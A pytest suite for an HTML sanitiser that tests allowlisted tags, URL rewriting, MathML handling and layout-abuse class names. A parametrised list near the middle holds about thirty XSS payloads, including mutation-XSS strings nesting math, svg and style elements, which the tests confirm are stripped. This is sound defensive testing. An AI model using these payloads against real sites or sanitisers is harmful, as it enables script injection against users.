"""Tests for the reader's HTML sanitiser: the allowlist, URL handling and adversarial input."""

import re

import pytest

from spyglass_service.radar.reader.sanitize import clean_html

BASE = "https://example.com/blog/post/"


def test_keeps_structure_tables_and_formatting() -> None:
    html = (
        "<h2>Title</h2><p>Some <em>text</em> and <strong>bold</strong> <code>x = 1</code></p>"
        "<ul><li>one</li></ul><table><thead><tr><th colspan='2'>H</th></tr></thead>"
        "<tbody><tr><td>a</td><td>b</td></tr></tbody></table><blockquote>q</blockquote>"
    )
    out = clean_html(html, BASE)
    for needle in ("<h2>Title</h2>", "<em>text</em>", "<strong>bold</strong>", "<code>x = 1</code>",
                   "<li>one</li>", 'colspan="2"', "<td>a</td>", "<blockquote>q</blockquote>"):
        assert needle in out


def test_empty_input_returns_empty_string() -> None:
    assert clean_html("", BASE) == ""
    assert clean_html("   \n ", BASE) == ""


def test_mathml_survives_with_tex_annotation() -> None:
    html = (
        '<math display="block" alttext="x^2"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup>'
        '</mrow><annotation encoding="application/x-tex">x^2</annotation></semantics></math>'
    )
    out = clean_html(html, BASE)
    assert "<math" in out and "<msup>" in out and "<annotation" in out
    assert 'alttext="x^2"' in out


def test_mathml_fraction_and_matrix_children_survive() -> None:
    html = "<math><mfrac><mi>a</mi><mi>b</mi></mfrac><mtable><mtr><mtd><mn>1</mn></mtd></mtr></mtable></math>"
    out = clean_html(html, BASE)
    assert "<mfrac>" in out and "<mtable>" in out and "<mtd>" in out


@pytest.mark.parametrize(
    "attack",
    [
        "<script>alert(1)</script>",
        "<p onclick=\"alert(1)\">x</p>",
        "<img src=x onerror=alert(1)>",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<a href=\" jav&#x09;ascript:alert(1)\">x</a>",
        "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
        "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
        "<iframe src=\"https://evil.example/\"></iframe>",
        "<svg onload=alert(1)><script>alert(1)</script></svg>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<form action=\"https://evil.example/\"><input name=a><button>go</button></form>",
        "<object data=\"https://evil.example/x.swf\"></object><embed src=\"https://evil.example/x\">",
        "<p style=\"background:url(javascript:alert(1))\">x</p>",
        "<style>body{background:url(javascript:alert(1))}</style>",
        "<base href=\"https://evil.example/\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">",
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<<script>script>alert(1)//<</script>/script>",
        "<img srcset=\"javascript:alert(1) 1x\" src=\"https://example.com/a.png\">",
        "<div id=\"x\" onmouseover=\"alert(1)\" class=\"a\">x</div>",
        "<template><script>alert(1)</script></template>",
        "<details open ontoggle=alert(1)>x</details>",
        "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        "<math><mi//xlink:href=\"data:x,<script>alert(4)</script>\">",
        "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
        "<math><annotation-xml encoding=\"text/html\"><script>alert(1)</script></annotation-xml></math>",
        "<a href=\"vbscript:msgbox(1)\">x</a><img src=\"jar:https://evil.example/x.jar!/a\">",
    ],
)
def test_attack_vectors_are_neutralised(attack: str) -> None:
    out = clean_html(attack, BASE).lower()
    assert "<script" not in out
    assert "onerror" not in out and "onclick" not in out and "onload" not in out
    assert "onmouseover" not in out and "ontoggle" not in out
    assert "javascript:" not in out
    assert "data:text" not in out
    for banned in ("<iframe", "<object", "<embed", "<form", "<input", "<button", "<style",
                   "<svg", "<base", "<meta", "<template", "<noscript", "<mglyph"):
        assert banned not in out
    assert "evil.example" not in out or 'href="https://evil.example' not in out


def test_javascript_href_leaves_text_but_no_link() -> None:
    out = clean_html('<p>see <a href="javascript:alert(1)">this</a></p>', BASE)
    assert "this" in out
    assert "<a" not in out


def test_data_urls_are_dropped_everywhere() -> None:
    out = clean_html('<img src="data:image/png;base64,AAAA"><p>t</p>', BASE)
    assert "data:" not in out and "<img" not in out


def test_relative_urls_become_absolute() -> None:
    out = clean_html('<a href="../other">o</a><img src="/img/a.png">', BASE)
    assert 'href="https://example.com/blog/other"' in out
    assert 'src="https://example.com/img/a.png"' in out


def test_srcset_is_absolutised_and_unsafe_entries_dropped() -> None:
    html = '<img src="/a.png" srcset="/a.png 1x, javascript:alert(1) 2x, //cdn.example/b,w_2/c.png 640w">'
    out = clean_html(html, BASE)
    assert 'srcset="https://example.com/a.png 1x, https://cdn.example/b,w_2/c.png 640w"' in out
    assert "javascript" not in out


def test_lazy_load_attributes_are_promoted() -> None:
    html = '<img src="data:image/gif;base64,R0lGOD" data-src="/real.jpg" width="600">'
    assert 'src="https://example.com/real.jpg"' in clean_html(html, BASE)
    html2 = '<img src="/ph.gif" data-srcset="/a.jpg 1x, /b.jpg 2x">'
    assert "https://example.com/b.jpg 2x" in clean_html(html2, BASE)


def test_images_and_links_get_safe_attributes() -> None:
    out = clean_html('<a href="/x">x</a><img src="/a.png" alt="A">', BASE)
    assert 'target="_blank"' in out
    assert 'rel="noopener noreferrer"' in out
    assert 'loading="lazy"' in out
    assert 'referrerpolicy="no-referrer"' in out
    assert 'decoding="async"' in out
    assert 'alt="A"' in out


def test_author_cannot_override_the_enforced_attributes() -> None:
    out = clean_html('<a href="/x" target="_self" rel="opener">x</a><img src="/a.png" loading="eager">', BASE)
    assert 'target="_self"' not in out and 'rel="opener"' not in out
    assert 'loading="eager"' not in out


def test_tracking_pixels_and_empty_wrappers_are_removed() -> None:
    html = ('<div><span> </span></div><img src="https://t.example/p.gif" width="1" height="1">'
            '<p>keep</p><div><div></div></div><p></p>')
    out = clean_html(html, BASE)
    assert out == "<p>keep</p>"


def test_in_page_anchor_links_are_unwrapped() -> None:
    out = clean_html('<a href="#sec1">jump</a><a href="/x">real</a>', BASE)
    assert "jump" in out
    assert "#sec1" not in out
    assert out.count("<a") == 1


def test_class_is_kept_only_for_code_language_and_math() -> None:
    out = clean_html('<div class="evil"><pre class="language-python"><code class="lang-py">x</code></pre></div>', BASE)
    assert 'class="evil"' not in out
    assert 'class="language-python"' in out and 'class="lang-py"' in out


def test_class_value_with_markup_is_rejected() -> None:
    out = clean_html('<code class="a&quot; onmouseover=&quot;alert(1)">x</code>', BASE)
    assert "onmouseover" not in out


def test_malformed_markup_does_not_raise() -> None:
    for html in ("<p><b>unclosed", "<table><tr><td>x", "</div></p>stray", "<a href=>", "<img src=>", "<!--", "<"):
        assert isinstance(clean_html(html, BASE), str)


def test_comments_are_stripped() -> None:
    assert "secret" not in clean_html("<!-- secret --><p>x</p>", BASE)


def test_output_has_only_allowlisted_tags() -> None:
    nasty = ("<p>a</p><custom-el>c</custom-el><font color=red>f</font><center>x</center>"
             "<video src=v.mp4></video><audio></audio><marquee>m</marquee>")
    tags = set(re.findall(r"<([a-z0-9-]+)", clean_html(nasty, BASE)))
    assert tags <= {"p"}


# --- Overlay and layout abuse through class names and sizes ----------------------------------


@pytest.mark.parametrize("tag", ["code", "pre"])
def test_utility_classes_cannot_survive_on_code_or_pre(tag: str) -> None:
    out = clean_html(f'<{tag} class="fixed inset-0 z-50 bg-white">x</{tag}>', BASE)
    assert "class" not in out and "fixed" not in out and "z-50" not in out


def test_only_language_tokens_survive_beside_a_utility_class() -> None:
    out = clean_html('<pre class="fixed language-python z-50"><code class="lang-c inset-0">x</code></pre>', BASE)
    assert 'class="language-python"' in out and 'class="lang-c"' in out
    assert "fixed" not in out and "z-50" not in out and "inset-0" not in out


def test_mathml_keeps_no_class_but_keeps_the_layout_attributes() -> None:
    html = (
        '<math class="fixed inset-0 z-50" display="block" alttext="x^2">'
        '<semantics><mrow class="absolute top-0"><mi class="hidden" mathvariant="bold">x</mi></mrow>'
        '<annotation class="fixed" encoding="application/x-tex">x^2</annotation></semantics></math>'
    )
    out = clean_html(html, BASE)
    assert "class" not in out
    assert 'display="block"' in out and 'alttext="x^2"' in out and 'mathvariant="bold"' in out


def test_absurd_mathml_sizes_are_dropped() -> None:
    out = clean_html('<math><mpadded width="99999px" height="99999px" depth="9999px"><mi>x</mi></mpadded>'
                     '<mspace width="1em"/></math>', BASE)
    assert "99999" not in out and "9999px" not in out
    assert 'width="1em"' in out


def test_no_inline_style_or_id_survives_on_any_tag() -> None:
    out = clean_html('<p style="position:fixed;inset:0" id="root">x</p><span style="z-index:9">y</span>', BASE)
    assert "style=" not in out and "id=" not in out
